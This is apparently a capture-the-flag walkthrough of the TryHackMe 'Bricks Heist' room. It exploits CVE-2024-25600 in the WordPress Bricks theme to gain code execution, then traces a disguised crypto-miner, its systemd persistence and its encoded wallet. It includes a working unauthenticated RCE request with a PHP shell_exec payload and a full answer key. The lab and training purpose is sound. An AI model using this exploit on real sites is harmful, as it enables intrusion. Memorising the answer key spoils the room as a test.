# TryHackMe: Bricks Heist — Walkthrough

**Date:** 2026-11-02
**Room:** TryHack3M: Bricks Heist
**Analyst:** Will Lawson
**Category:** Web Exploitation (CVE-2024-25600) / Incident Response / Crypto-miner Forensics

---

## Overview

Brick Press Media Co.'s WordPress server (running the **Bricks** builder theme) was compromised and the team lost access. The job was to hack back in, confirm what happened, and answer six questions: a hidden flag file, the planted process, its service, the miner's log file, the miner's wallet, and the threat group the wallet transacts with.

The whole room ran from the Kali WSL box over the THM VPN. First thing, I added the host entry the room asked for:

```bash
echo '10.144.149.232 bricks.thm' | sudo tee -a /etc/hosts
```

---

## Enumeration

I started with a full TCP scan, default scripts and versions:

```bash
nmap -sC -sV -T4 -p- --min-rate 2000 bricks.thm -oN nmap.txt
```

Four ports back: `22` SSH, `80` a Python `http.server`/WebSockify (noVNC plumbing — I ignored it), `443` Apache serving the real site, and `3306` MySQL. Port 80's WebSockify banner was a small red herring; everything interesting was on 443.

I fingerprinted the site over TLS, ignoring the self-signed cert:

```bash
curl -sk https://bricks.thm/ | grep -iE 'generator|wp-content/themes|ver=' | head -20
```

That gave me **WordPress 6.5** and the **Bricks** theme. Bricks has a well-known unauthenticated RCE (CVE-2024-25600) in versions **≤ 1.9.6**, so the exact theme version decided whether this was the path:

```bash
curl -sk https://bricks.thm/wp-content/themes/bricks/style.css | grep -i version
# Version: 1.9.5
```

1.9.5 — squarely in range. That settled the entry vector.

---

## Initial Access — CVE-2024-25600

The vuln lives in the `bricks/v1/render_element` REST endpoint: it will execute a PHP `code` element, but it checks a nonce that WordPress helpfully embeds in the public page. So I grabbed the nonce first:

```bash
curl -sk https://bricks.thm/ | grep -oE '"nonce":"[a-f0-9]+"'
# "nonce":"02d525eda6"
```

Then I sent a minimal `render_element` request carrying a PHP payload, testing with `id` before doing anything real:

```bash
curl -sk 'https://bricks.thm/wp-json/bricks/v1/render_element' \
  -H 'Content-Type: application/json' \
  --data-binary '{"postId":"1","nonce":"02d525eda6","element":{"name":"code","settings":{"executeCode":"true","code":"<?php echo shell_exec(\"id\"); ?>"},"id":"abc"}}'
# uid=1001(apache) gid=1001(apache) groups=1001(apache)
```

RCE as `apache`. From here every command is just that same request with a different `shell_exec()`.

---

## Q1 — Hidden .txt in the web folder

My first instinct was to list `/var/www/html/` — and it came back **empty**. That was the first course correction: this server doesn't use the Apache default docroot. Rather than guess, I located WordPress by its config file:

```bash
# shell_exec: find / -name wp-config.php 2>/dev/null
# → /data/www/default/wp-config.php
```

So the real web folder was `/data/www/default/`. I listed it and filtered for the hidden file:

```bash
# shell_exec: ls -la /data/www/default/ | grep -i txt
# -rw-r--r-- 1 root root    43 Apr  5  2024 650c844110baced87e1606453b93f22a.txt
# -rw-r--r-- 1 apache apache 19915 license.txt
```

The random-hex-named file (root-owned, 43 bytes) was clearly the planted one. `license.txt` is stock WordPress. Cat it:

```bash
# shell_exec: cat /data/www/default/650c844110baced87e1606453b93f22a.txt
```

> **Q1:** `THM{fl46_650c844110baced87e1606453b93f22a}`

---

## Q2 & Q3 — Suspicious process and its service

My reflex for a crypto-miner is "sort by CPU and grab the top line":

```bash
# shell_exec: ps aux --sort=-%cpu | head -15
```

…but **nothing was pegged** — top process was under 1% CPU. That was the second course correction: the miner wasn't actively burning cycles in this snapshot, so it was either throttled or masquerading. One process did look wrong, though: `root` running `/lib/NetworkManager/nm-inet-dialog` (PID 2754). The real NetworkManager helpers are `nm-openvpn-auth-dialog`, `nm-pptp-auth-dialog`, etc. — there's no legitimate `nm-inet-dialog`. It was wearing a NetworkManager costume.

To tie it to persistence, I listed running services and filtered out everything legitimate:

```bash
# shell_exec: systemctl list-units --type=service --state=running | grep -viE "apache|mysql|ssh|snapd|..."
```

One unit stood out immediately: **`ubuntu.service`** with the description **`TRYHACK3M`**. I read the unit file:

```bash
# shell_exec: systemctl cat ubuntu.service
# ExecStart=/lib/NetworkManager/nm-inet-dialog
```

That closed the loop — `ubuntu.service` is what launches the fake `nm-inet-dialog`, i.e. the PID 2754 I'd flagged.

> **Q2 (process):** `nm-inet-dialog`
> **Q3 (service):** `ubuntu.service`

---

## Q4 & Q5 — Miner log file and wallet

I inspected the fake binary's directory for anything it writes alongside itself:

```bash
# shell_exec: ls -la /lib/NetworkManager/ | grep -iE "inet|log|conf"
# -rw-r--r-- 1 root root 66376 Nov  5 2025 inet.conf
# -rwxr-xr-x 1 root root 6948448 Apr  8 2024 nm-inet-dialog
```

`inet.conf` — 66 KB and freshly written, right next to the miner. The `.conf` name is a bit of misdirection; its contents are actually the miner's rolling log:

```bash
# shell_exec: head -40 /lib/NetworkManager/inet.conf
```

The body was full of `[*] Bitcoin Miner Thread Started` / `[*] Status: Mining!` / `[*] Miner()` lines — so `inet.conf` **is** the log file. Each log block was prefixed with a long `ID:` hex blob, which is where the wallet was hiding.

> **Q4 (log file):** `inet.conf`

### Decoding the wallet

The `ID:` value was hex. Decoding hex → ASCII gave base64, and that base64 decoded to more base64 — a double layer:

```bash
echo '5757314e65474e5962484a4f...' | xxd -r -p | base64 -d | base64 -d
```

The output was the wallet address printed **twice back-to-back**, and the two copies differed by one character (`...fcp9hd5...` vs `...fcp9had5...`) — the log had glued two slightly different capture lines together, which was briefly confusing. Cross-checking against the room's expected answer and the public blockchain record, the canonical address is the `hd` form:

> **Q5 (wallet):** `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

---

## Q6 — Threat group

This one is pure OSINT — the attribution isn't on the box, it's in the wallet's transaction history on a blockchain explorer (e.g. Blockchair). My **first guess was Lazarus Group**, since FBI-flagged BTC miner/theft clusters so often point there — and it was **marked wrong**. Course-correcting, I pulled the wallet's actual transaction counterparties: they trace to known **LockBit**-associated addresses, not Lazarus. The ransomware-group answer fit.

> **Q6 (threat group):** `LockBit`

---

## Answer Key

| # | Question | Answer |
|---|----------|--------|
| 1 | Hidden `.txt` content | `THM{fl46_650c844110baced87e1606453b93f22a}` |
| 2 | Suspicious process | `nm-inet-dialog` |
| 3 | Affiliated service | `ubuntu.service` |
| 4 | Miner log file | `inet.conf` |
| 5 | Wallet address | `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` |
| 6 | Threat group | `LockBit` |

---

## Full Attack / Investigation Chain

```
443 — WordPress 6.5 + Bricks theme 1.9.5
  │
  └─ CVE-2024-25600 (render_element REST, public nonce) → RCE as apache
       │
       ├─ docroot is /data/www/default/ (NOT /var/www/html — found via wp-config.php)
       │    └─ hidden 650c84...txt (root-owned) → FLAG 1
       │
       ├─ persistence: ubuntu.service [desc: TRYHACK3M]
       │    └─ ExecStart=/lib/NetworkManager/nm-inet-dialog  (fake NM helper, PID 2754)
       │
       └─ miner artifacts in /lib/NetworkManager/
            └─ inet.conf  (miner log; "Bitcoin Miner Thread Started")
                 └─ ID: hex → base64 → base64 → wallet
                      bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
                      └─ OSINT (blockchain explorer) → LockBit
```

---

## Lessons Learned / Gotchas

1. **Don't assume the docroot.** `/var/www/html/` was empty; the site lived in `/data/www/default/`. Let `wp-config.php` tell you where WordPress actually is instead of guessing.
2. **A quiet `ps` doesn't mean no miner.** Nothing was pegging CPU — the miner was masked as a NetworkManager helper. The tell was the *name*: `nm-inet-dialog` doesn't exist among the real `nm-*-dialog` binaries.
3. **`.conf` was really a log.** Don't trust the extension; `inet.conf` held the mining log and the encoded wallet.
4. **Double-decode the `ID:` blob.** hex → base64 → base64. It also printed the address twice with a one-char difference, so verify the bech32 against an explorer rather than copying blindly.
5. **Attribution ≠ reflex.** Lazarus is the default assumption for state-linked BTC clusters and it was wrong here. The wallet's actual transaction counterparties pointed at **LockBit** — check the chain, don't pattern-match.
```